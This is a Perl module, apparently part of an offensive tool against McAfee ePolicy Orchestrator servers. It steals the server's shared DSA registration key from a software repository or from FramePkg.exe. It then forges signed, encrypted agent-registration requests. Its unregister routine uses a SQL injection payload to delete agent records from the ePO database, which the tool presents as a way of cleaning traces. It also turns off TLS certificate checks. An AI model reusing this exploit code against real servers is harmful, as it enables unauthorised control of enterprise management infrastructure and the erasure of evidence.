package Epowner::Epo;

use Crypt::OpenSSL::DSA;
use MIME::Base64;

use strict;
use warnings;

# git-issue-1
IO::Socket::SSL::set_ctx_defaults(SSL_verify_mode => SSL_VERIFY_NONE);
$ENV{PERL_LWP_SSL_VERIFY_HOSTNAME} = 0;


sub mode_unregister {

        my $this = shift;


	if (not $this->{state_registered}){
		$this->print_err("[-] You don't have any registered agent.\n");
		return 0;
	}

	print "[*] Warning: Ungegistering your agent means that you wont be able to perform any further actions on the ePo server\n";
	print "             (example, cleaning your traces using '--wipe'). Are you sure to want to continue ? [N/y] : ";
	

	my $doit = <>; chomp($doit);                        
	if($doit eq '' or $doit eq 'n' or  $doit eq 'N'){
		print "[*] --unregister canceled\n";
		return 0;
	}

        my $sqli =
                "') ; " .

		"declare \@TempID int; " .
		"set \@TempID =  (select AutoID from EPOLeafNode where AgentGUID = '" . $this->{agent_guid}. "'); " .
		"delete from EPOLeafNode where AgentGUID = '" . $this->{agent_guid}. "' ; " .
		"delete from dbo.EPOComputerProperties where ParentID = \@TempID ; " .
                " -- ";

        print "[*] Sendng Unregister request\n";
        my $http_request = $this->mode_common_generate_fullprops_request($sqli);
        $this->send_http_request($http_request);
	print "[*] Done\n";

	$this->{state_registered} = 0;

        return 1;
}



#====================================================================
# FUNCTION: Registration : Managing various crypto keys
#====================================================================

sub mode_register_crypto_managment {

	my $this = shift;

	my $server_host = $this->{server_host};
	my $server_port = $this->{server_port};


	# Key content
        my $srpubkey  = '';             # Public DSA key of server
        my $reqseckey = '';             # "Common" private DSA key for registration request signature

	
	# Do the keys provided from local files ?
	#========================================
	if($this->{srpubkey_bin} ne "" and $this->{reqseckey_bin} ne ""){

		# reading key files
                open  FILE, "$this->{reqseckey_bin}" or die "[-] ERROR (mode_register_crypto_managment): can't open '" . $this->{reqseckey_bin} ."' for reading\n";
                read  FILE, $reqseckey, -s FILE;
                close FILE;

                open  FILE, "$this->{srpubkey_bin}" or die "[-] ERROR (mode_register_crypto_managment): can't open '" . $this->{srpubkey_bin} ."' for reading\n";
                read  FILE, $srpubkey, -s FILE;
                close FILE;

	# or from FramePkg.exe ?
	#=========================
	}elsif($this->{framepkg_exe} ne ""){

		my $temp_folder = $this->{temp_folder} . "framepkg";
		my $bin_7z = $this->{seven_z_path};
		my $exe = $this->{framepkg_exe};

		# create tmp folders if needed
		if(not -d $temp_folder){
			mkpath($temp_folder);
			if(not -d $temp_folder){
				$this->print_err ("[-] ERROR (mode_register_crypto_managment): can't create directory path $temp_folder\n");
				exit;
			}
		}

		# uncompress FramePkg.exe
		print "      [+] Uncompressing FramePkg.exe ($bin_7z x -o$temp_folder $exe)\n" if $this->{verbose};
		system("$bin_7z x -o$temp_folder $exe >/dev/null");
		if(($? >> 8) ne 0){
			$this->print_err("[-] ERROR ($bin_7z): failed to execute: $!\n");
			exit;
		}


		# reading key files
		open  FILE, "$temp_folder/reqseckey.bin" or die "[-] ERROR (mode_register_crypto_managment): can't open $temp_folder/reqseckey.bin for reading\n";
		read  FILE, $reqseckey, -s FILE;
		close FILE;

		open  FILE, "$temp_folder/srpubkey.bin" or die "[-] ERROR (mode_register_crypto_managment): can't open $temp_folder/srpubkey.bin for reading\n";
		read  FILE, $srpubkey, -s FILE;
		close FILE;


	# Then trying to get the keys from ePO server
	#========================================
	}else{
		($reqseckey, $srpubkey) = $this->mode_register_download_keys()
	}

        # Did we find the keys ?
	#=======================
        if(length($srpubkey) eq 0 || length($reqseckey) eq 0){
		print "[-] ERROR: Could not retrieve srpubkey.bin & reqseckey.bin files from ePo server. Try --verbose if not already done.\n";
		print "           If for some reasons, you get a 500 error while trying to download the keys,\n";
		print "           try to get them using curl and use the following options:\n";
		print "              \"--srpubkey <file> --reqseckey <file> \"\n";
		print "                         OR\n";
		print "              \"--framepkg <file>\n";
		exit;
	}


        # Dissecting reqseckey.bin and create a new DSA object
        #====================================================================

        print "[*] Managing crypto keys\n";
        print "      [+] Converting 'reqseckey.bin' into DSA private object\n" if $this->{verbose};

        # Convert Agent Private DSA key
        my @reqseckey_array = split(//,$reqseckey);
        my ($reqseckey_p, $reqseckey_q, $reqseckey_g, $reqseckey_pub, $reqseckey_priv);
        # Extract p, q, g, priv and pub
        for(my $i=2;$i<130; $i++){   $reqseckey_p    .= $reqseckey_array[$i] }
        for(my $i=132;$i<152; $i++){ $reqseckey_q    .= $reqseckey_array[$i] }
        for(my $i=154;$i<282; $i++){ $reqseckey_g    .= $reqseckey_array[$i] }
        for(my $i=284;$i<412; $i++){ $reqseckey_pub  .= $reqseckey_array[$i] }
        for(my $i=415;$i<435; $i++){ $reqseckey_priv .= $reqseckey_array[$i] }

        # Create and set up DSA object (for Agent signature)
        $this->{dsa_reqseckey_private}->set_pub_key($reqseckey_pub);
        $this->{dsa_reqseckey_private}->set_priv_key($reqseckey_priv);
        $this->{dsa_reqseckey_private}->set_p($reqseckey_p);
        $this->{dsa_reqseckey_private}->set_q($reqseckey_q);
        $this->{dsa_reqseckey_private}->set_g($reqseckey_g);


        # Hashing srpubkey.bin
        #====================================================================

        print "      [+] Hashing 'srpubkey.bin' for fun and profit\n" if $this->{verbose};

        $this->{server_pubkeyhash} = encode_base64(sha1($srpubkey),"");


        # Generating Agent DSA Keys (pub/priv)
        #====================================================================

        print "      [+] Generating Agent DSA Keys (pub/priv)\n" if $this->{verbose};

        $this->{dsa_agent} = Crypt::OpenSSL::DSA->generate_parameters(1024);
        $this->{dsa_agent}->generate_key;


        # Converting Agent Public DSA Key to ePo format
        #====================================================================

        print "      [+] Converting Agent Public DSA Key to ePo format\n" if $this->{verbose};
        $this->{agent_pubkey_epo_format} =
                "\x01\x00\x0C\x00" . "agpubkey.bin" .   # header
                "\x9C\x01\x00\x00" .                    # len of key
                "\x40\x00" . $this->{dsa_agent}->get_p() .
                "\x00\xa0" . $this->{dsa_agent}->get_q() .
                "\x03\xff" . $this->{dsa_agent}->get_g() .
                "\x03\xff" . $this->{dsa_agent}->get_pub_key() ;

} # end of mode_register_crypto_managment()



#====================================================================
# FUNCTION: Refister : Generate HTTP Request
#====================================================================
sub mode_register_generate_request{
	
	my $this = shift;

        # manage Keys
        $this->mode_register_crypto_managment();

	# build data
	print "      [+] Generating data structures\n" if $this->{verbose};
        $this->build_struct_register_header1();
        $this->build_struct_register_header2();
        $this->build_struct_register_fullprops();

	# Compressing Agent Public Key + FULL Properties XML
	#====================================================================
	print "      [+] Compressing AgentPubKey and FullProps XML\n" if $this->{verbose};
	my $data_compressed  = compress_deflate($this->{agent_pubkey_epo_format} . $this->{props_xml});


	# Updating various fields in binary_header1
	#====================================================================
	print "      [+] Updating various fields in binary_header1\n"  if $this->{verbose};

	# Update HEADER_LEN in "binary_header1" (little-endian)
	my $final_header_len = pack("V", length($this->{binary_header1}) + length($this->{binary_header2}));
	$this->{binary_header1} =~ s/WWWW/$final_header_len/;

	# Update DATA_LEN in "binary_header1" (little-endian)
	my $final_data_len = pack("V", length($data_compressed));
	$this->{binary_header1} =~ s/ZZZZ/$final_data_len/;


	# XORing binary_header1
	#====================================================================
	print "      [+] XORing binary_header1 (why? no idea ..)\n"  if $this->{verbose};
	# XOR post_binary_header1 (because it's fun ?)
	my $binary_header1_xored = xor_str($this->{binary_header1}, 0xaa);



	# Generating DSA Signature
	#====================================================================
	print "      [+] Generating DSA Signature\n" if $this->{verbose};
	my $signature = dsa_sign(
				$this->{binary_header1} . $this->{binary_header2} . $data_compressed,   # to sign
				$this->{dsa_reqseckey_private}						# dsa object
		);

	# Encrypting
	#====================================================================

	print "      [+] Encrypting (3DES)\n" if $this->{verbose};
	my $data_encrypted = mcafee_3des_encrypt(
			$this->{binary_header2} . $data_compressed . $signature,	# to encrypt
			sha1_hex($this->{des3_symkey})					# 3DES key in hex
		);


	# Building final HTTP POST request
	#====================================================================
	print "      [+] Building final HTTP POST request\n" if $this->{verbose};
	# Final binary package
	my $post_data=
	        $binary_header1_xored .
        	$data_encrypted ;

	return $post_data;

	# greoj
	# Final HTTP request
#	my $http_req =
#	        "POST /spipe/pkg?AgentGuid=" .$this->{agent_guid} . "&Source=Agent_3.0.0 HTTP/1.1\r\n" .
#        	"User-Agent: Mozilla/4.0 (compatible; SPIPE/3.0; Windows)\r\n" .
#	        "Accept: application/octet-stream\r\n" .
#	        "Accept-Language: en-us\r\n" .
#	        "Host: " . $this->{server_host} . "\r\n" .
#	        "Content-Type: application/octet-stream\r\n" .
#	        "Content-Length: " . length($binary_struct) . "\r\n" .
#	        "\r\n" .
#	        $binary_struct;
#
#	return $http_req;
}


#====================================================================
# FUNCTION: Refister : Downloading keys from ePO server
#====================================================================
sub mode_register_download_keys {

	my $this = shift;

	my $server_host = $this->{server_host};
	my $server_port = $this->{server_port};

	
        # Download DSA Keys from ePo Server
        #====================================================================

        print "[*] Downloading DSA keys from ePo server (srpubkey.bin & reqseckey.bin)\n";
        # Path list where to search for srpubkey.bin and reqseckey.bin on the ePo server
        my @software_repo = (
                "/Software/Current/EPOAGENT3000/Install/0409", # seems to be default        
	);

	# Key content
        my $srpubkey  = '';             # Public DSA key of server
        my $reqseckey = '';             # "Common" private DSA key for registration request signature


	# Browser & User agent
        my $get_request = HTTP::Request->new;
	$get_request->method('GET');
        my $user_agent  = LWP::UserAgent->new (ssl_opts => { verify_hostname => 0 , SSL_verify_mode => SSL_VERIFY_NONE });

	# Try to download srpubkey.bin & reqseckey.bin
        foreach my $uri (@software_repo){
                print "      [+] Trying from: https://${server_host}:${server_port}${uri}/\n" 
			if $this->{verbose};

                # Try to get srpubkey.bin
                $get_request->uri("https://$server_host:$server_port/$uri/srpubkey.bin");
                my $response = $user_agent->request($get_request);
                if ($response->code eq "200"){
                        print "      [+] Found srpubkey !\n" if $this->{verbose};
                        $srpubkey =  $response->content;
                }else{
			print "      [-] srpubkey.bin failure. HTTP code : " . $response->code . "\n" if $this->{verbose};
		}

                # Try to get reqseckey.bin
                $get_request->uri("https://$server_host:$server_port/$uri/reqseckey.bin");
                $response = $user_agent->request($get_request);
                if ($response->code eq "200"){
                        print "      [+] Found reqseckey.bin !\n" if $this->{verbose};
                        $reqseckey =  $response->content;
                }else{
                        print "      [-] reqseckey.bin failure. HTTP code : " . $response->code . "\n" if $this->{verbose};
                }

                # exit loop ?
                last if(length($srpubkey) ne 0 && length($reqseckey) ne 0);
       }

	# Did we find the keys ?
        if(length($srpubkey) eq 0 || length($reqseckey) eq 0){

		print "[-] WARN: Could not retrieve srpubkey.bin & reqseckey.bin files from ePo server, trying 'FramePkg.exe'\n";
		print "[*] Downloading 'FramePkg.exe' from ePo server \n";

		# fallback to FramePkg.exe download
        	foreach my $uri (@software_repo){
                	print "      [+] Trying from: https://${server_host}:${server_port}${uri}/\n" 
                        	if $this->{verbose};

        	        $get_request->uri("https://$server_host:$server_port/$uri/FramePkg.exe");
                	my $response = $user_agent->request($get_request);
	                
			# HTTP 200 OK
			if ($response->code eq "200"){
        	                print "      [+] Found FramePkg.exe !\n" if $this->{verbose};
                	  
				my $temp_folder = $this->{temp_folder} . "framepkg";
				my $bin_7z = $this->{seven_z_path}; 

		 	       	# create tmp folders if needed
        			if(not -d $temp_folder){
					mkpath($temp_folder);
        				if(not -d $temp_folder){
                				$this->print_err ("[-] ERROR (mode_register_crypto_managment): can't create directory path $temp_folder\n");
                				exit;
	        			}
     				}

				# Save EXE 
				print "      [+] Saving FramePkg.exe to $temp_folder/FramePkg.exe\n" if $this->{verbose};
				open FILE, ">$temp_folder/FramePkg.exe" or die "[-] ERROR (mode_register_crypto_managment): can't open $temp_folder/FramePkg.exe for writing\n";
                		print FILE $response->content;
                		close FILE;	


				# uncompress FramePkg.exe
				print "      [+] Uncompressing FramePkg.exe ($bin_7z x -o$temp_folder $temp_folder/FramePkg.exe)\n" if $this->{verbose};
				system("$bin_7z x -o$temp_folder $temp_folder/FramePkg.exe >/dev/null");
				if(($? >> 8) ne 0){
					$this->print_err("[-] ERROR ($bin_7z): failed to execute: $!\n");
					exit;
				}				


				# reading key files
				open  FILE, "$temp_folder/reqseckey.bin" or die "[-] ERROR (mode_register_crypto_managment): can't open $temp_folder/reqseckey.bin for reading\n";
				read  FILE, $reqseckey, -s FILE;	
				close FILE;

                                open  FILE, "$temp_folder/srpubkey.bin" or die "[-] ERROR (mode_register_crypto_managment): can't open $temp_folder/srpubkey.bin for reading\n";
                                read  FILE, $srpubkey, -s FILE;
                                close FILE;

	                }else{
        	                print "      [-] FramePkg.exe failure. HTTP code : " . $response->code . "\n" if $this->{verbose};
                	}

		}

        }

	return ($reqseckey , $srpubkey);

}


1;
